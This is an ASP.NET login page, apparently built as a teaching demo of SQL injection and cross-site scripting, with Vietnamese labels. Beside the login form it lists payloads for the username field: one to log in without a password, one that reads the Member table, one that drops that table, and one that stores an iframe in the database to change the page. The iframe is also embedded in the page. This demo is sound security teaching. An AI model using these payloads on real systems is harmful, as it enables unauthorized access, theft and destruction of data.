<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="LogInInjection.aspx.cs" Inherits="WebApp.LogInInjection" %>
<asp:Content ID="Content1" ContentPlaceHolderID="HeadContent" runat="server">
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">
    <div>
        <h3>LogIn</h3>
        <asp:Label runat="server" ID="lblStatus"></asp:Label>
        <table>
            <tr>
                <td>User Name:</td>
                <td><asp:TextBox runat="server" ID="txtName"></asp:TextBox>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" 
                        ControlToValidate="txtName" ErrorMessage="(*)" ForeColor="Red"></asp:RequiredFieldValidator>
                </td>
            </tr>
            <tr>
                <td>Password:</td>
                <td><asp:TextBox runat="server" ID="txtPass" TextMode="Password"></asp:TextBox>
                    <asp:RequiredFieldValidator ID="RequiredFieldValidator2" runat="server" 
                        ControlToValidate="txtPass" ErrorMessage="(*)" ForeColor="Red"></asp:RequiredFieldValidator>
                </td>
            </tr>
            <tr>
                <td>&nbsp;</td>
                <td><asp:Button runat="server" ID="btnLogin" Text="LogIn" 
                        onclick="btnLogin_Click" /></td>
            </tr>
            <tr>
                <td colspan="2"><asp:Label runat="server" ID="lblInfo"></asp:Label></td>
            </tr>
            <tr>
                <td>-Đăng nhập không mật khẩu</td>
                <td>hoahue - 1' OR '1'='1</td>
            </tr>
            <tr>
                <td>-Truy vấn lấy thông tin bảng Member</td>
                <td>hoahue - 1' OR '1'='1'; SELECT * FROM Member ;--</td>
            </tr>
            <tr>
                <td>-Xóa bảng Member</td>
                <td>hoahue - 1' OR '1'='1'; Drop [Member] ;--</td>
            </tr>
            <tr>
                <td>Xây dựng Demo về tấn công XSS trên trang web. Test các trường hợp xảy</td>
                <td>-Thay đổi giao diện hiện thị của trang: hoahue - 1' OR '1'='1'; INSERT INTO Member(Name) VALUES("<iframe src='http://www.w3schools.com' style='display:block; position:absolute; left:0; top:0; width:200px; height:500px;'></iframe>");-- </td>
            </tr>
            <tr>
                <td colspan="2">
                    <iframe src='http://www.w3schools.com' style='display:block; position:absolute; left:0; top:0; width:200px; height:500px;'></iframe>
                </td>
            </tr>
        </table>
    </div>
</asp:Content>
